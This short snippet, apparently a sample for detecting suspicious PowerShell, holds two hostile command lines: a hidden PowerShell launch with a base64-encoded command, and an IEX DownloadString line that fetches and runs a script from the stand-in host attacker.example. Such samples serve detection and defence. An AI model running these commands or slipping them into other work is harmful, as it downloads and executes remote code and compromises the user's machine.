# Suspicious PowerShell: encoded command and download-invoke.
powershell -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=
IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/a.ps1')
